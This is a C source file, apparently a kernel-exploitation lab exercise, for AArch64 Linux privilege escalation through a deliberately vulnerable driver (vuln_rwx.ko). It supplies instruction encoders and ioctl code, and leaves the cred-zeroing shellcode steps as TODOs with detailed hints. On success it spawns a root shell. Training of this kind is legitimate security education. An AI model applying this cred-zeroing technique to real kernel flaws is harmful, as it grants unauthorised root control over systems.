/*
 * raw_privesc.c - Direct cred-zeroing privilege escalation
 *
 * Exercise: Build AArch64 shellcode that escalates to root by directly
 * zeroing the uid/gid fields in current->cred, without calling any
 * kernel API functions.
 *
 * The shellcode does NOT need /proc/kallsyms. It uses:
 *   1. mrs sp_el0 to find current (task_struct *)
 *   2. ldr to chase the cred pointer
 *   3. str xzr to zero uid/gid fields
 *
 * Prerequisites:
 *   - offsets.h filled in from find_offsets module
 *   - vuln_rwx.ko loaded on the target
 *
 * Build: make raw_privesc
 * Run:   ./raw_privesc
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#include "offsets.h"

/* --- ioctl interface (must match vuln_rwx driver) --- */

struct vuln_rwx_request {
	void *code;
	size_t len;
};
#define VULN_RWX_EXEC _IOW('R', 1, struct vuln_rwx_request)

/* --- AArch64 instruction encoders --- */

/*
 * mrs Xt, SP_EL0
 *
 * On AArch64 Linux, SP_EL0 holds the current task_struct pointer
 * when executing at EL1. This is what the 'current' macro compiles to.
 *
 * Encoding: MRS Xt, S3_0_C4_C1_0  ->  0xD5384100 | Rt
 */
static uint32_t encode_mrs_sp_el0(int rt)
{
	return 0xD5384100 | rt;
}

/*
 * ldr Xt, [Xn, #imm]
 *
 * 64-bit load with unsigned offset. The immediate is scaled by 8
 * (i.e., the hardware stores imm/8 in the instruction).
 *
 * Encoding: 11_111_0_01_01_imm12_Rn_Rt  ->  0xF9400000 | ...
 */
static uint32_t encode_ldr_imm(int rt, int rn, int offset)
{
	uint32_t imm12 = offset / 8;
	return 0xF9400000 | (imm12 << 10) | (rn << 5) | rt;
}

/*
 * stur xzr, [Xn, #simm9]
 *
 * Unscaled 64-bit store of zero. Unlike the scaled str (which requires
 * the offset to be a multiple of 8), stur accepts any byte offset in
 * [-256, 255]. Use this when uid_offset is not 8-byte aligned.
 *
 * Encoding: 11_111_000_00_0_imm9_00_Rn_Rt  ->  0xF8000000 | ...
 */
static uint32_t encode_stur_xzr(int rn, int offset)
{
	uint32_t imm9 = (uint32_t)offset & 0x1FF;
	return 0xF8000000 | (imm9 << 12) | (rn << 5) | 31;
}

/*
 * ret
 *
 * Return to caller (branch to x30).
 * Encoding: 0xD65F03C0
 */
static uint32_t encode_ret(void)
{
	return 0xD65F03C0;
}

/*
 * build_shellcode - Construct the raw cred-zeroing shellcode
 *
 * Returns the number of instructions written to buf.
 *
 * The shellcode:
 *   1. Reads current task_struct from SP_EL0
 *   2. Loads the cred pointer from task_struct
 *   3. Zeros uid+gid, suid+sgid, euid+egid, fsuid+fsgid (4 stores)
 *   4. Returns to caller
 *
 * Total: 7 instructions, 28 bytes. No stack frame, no function calls.
 */
static int build_shellcode(uint32_t *buf)
{
	int i = 0;

	/*
	 * TODO 1: mrs x0, sp_el0
	 * Get the current task_struct pointer. On AArch64 Linux, SP_EL0
	 * is repurposed to hold 'current' when running at EL1.
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 2: ldr x0, [x0, #CRED_OFFSET]
	 * Chase the cred pointer: x0 = current->cred
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 3: Zero uid + gid (8 bytes at UID_OFFSET)
	 * str xzr writes 8 bytes of zeros. uid (4 bytes) and gid (4 bytes)
	 * are adjacent and 8-byte aligned, so one store zeros both.
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 4: Zero suid + sgid (8 bytes at UID_OFFSET + 8)
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 5: Zero euid + egid (8 bytes at UID_OFFSET + 16)
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 6: Zero fsuid + fsgid (8 bytes at UID_OFFSET + 24)
	 */
	/* buf[i++] = ??? */

	/*
	 * TODO 7: ret
	 * Return to the driver. x0 is the only register we touched,
	 * and it's caller-saved, so no stp/ldp needed.
	 */
	/* buf[i++] = ??? */

	return i;
}

int main(void)
{
	uint32_t shellcode[16];
	int fd, count;
	struct vuln_rwx_request req;

	printf("[*] Raw cred-zeroing exploit (no kallsyms needed)\n");

	if (CRED_OFFSET == 0 || UID_OFFSET == 0) {
		fprintf(stderr, "[-] offsets.h not filled in!\n");
		fprintf(stderr, "    Run: insmod find_offsets.ko && dmesg | tail\n");
		fprintf(stderr, "    Then update CRED_OFFSET and UID_OFFSET in offsets.h\n");
		return 1;
	}

	printf("[*] Using offsets: cred=0x%x, uid=0x%x\n",
	       CRED_OFFSET, UID_OFFSET);

	/* Build shellcode */
	count = build_shellcode(shellcode);
	if (count == 0) {
		fprintf(stderr, "[-] build_shellcode returned 0 instructions.\n");
		fprintf(stderr, "    Did you fill in the TODOs?\n");
		return 1;
	}

	printf("[*] Shellcode: %d instructions (%zu bytes)\n",
	       count, count * sizeof(uint32_t));

	/* Open the vulnerable driver */
	fd = open("/dev/vuln_rwx", O_RDWR);
	if (fd < 0) {
		perror("open /dev/vuln_rwx");
		fprintf(stderr, "    Is vuln_rwx.ko loaded?\n");
		return 1;
	}

	/* Send shellcode */
	req.code = shellcode;
	req.len  = count * sizeof(uint32_t);

	printf("[*] Sending %zu bytes to /dev/vuln_rwx...\n", req.len);

	if (ioctl(fd, VULN_RWX_EXEC, &req) < 0) {
		perror("ioctl VULN_RWX_EXEC");
		close(fd);
		return 1;
	}
	close(fd);

	/* Check result */
	if (getuid() == 0) {
		printf("[+] SUCCESS: uid=0 (root)\n");
		printf("[*] Spawning root shell...\n");
		execl("/bin/sh", "sh", NULL);
	} else {
		printf("[-] FAILED: uid=%d (not root)\n", getuid());
		printf("    Check your offsets and shellcode encoding.\n");
		return 1;
	}

	return 0;
}
